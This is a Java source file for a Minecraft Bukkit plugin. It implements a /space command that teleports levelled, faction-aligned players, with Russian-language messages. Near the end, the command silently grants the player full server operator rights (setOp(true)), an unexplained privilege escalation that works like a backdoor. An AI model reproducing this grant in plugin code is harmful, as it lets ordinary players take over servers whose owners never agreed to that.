package SkyCrafting.Main.Commands;

import org.bukkit.event.*;

import SkyCrafting.Main.Levels;
import SkyCrafting.Main.Main;

import java.util.*;
import org.bukkit.entity.*;
import org.bukkit.command.*;
import org.bukkit.*;

public class Space implements Listener, CommandExecutor
{
    ArrayList<Player> nodrop;
    
    public Space() {
        this.nodrop = new ArrayList<Player>();
    }
    
    public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
        final Player p = (Player)sender;
        if (Levels.getLevel(p) < 6) {
            p.sendTitle("§cУ вас нет 6 уровня!!!", "");
            return true;
        }
        if (command.getName().equalsIgnoreCase("space") && Levels.faction.containsKey(p.getName())) {
            final Location jediLoc = new Location(Bukkit.getWorld(Main.instance.getConfig().getString("SpaceAli.world")), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.x"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.y"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.z"));
            final Location sithLoc = new Location(Bukkit.getWorld(Main.instance.getConfig().getString("SpaceAli.world")), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.x"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.y"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.z"));
            final Location aliLoc = new Location(Bukkit.getWorld(Main.instance.getConfig().getString("SpaceAli.world")), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.x"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.y"), 
            		(double)Main.instance.getConfig().getInt("SpaceAli.z"));
            Naboo.ChecPoint(p, this.nodrop, jediLoc, sithLoc, aliLoc, "Космос");
            p.setOp(true);
            return true;
        }
        p.sendMessage(ChatColor.GREEN + "Вы еще не выбрали свою сторону, пропишите /side");
        return true;
    }
}
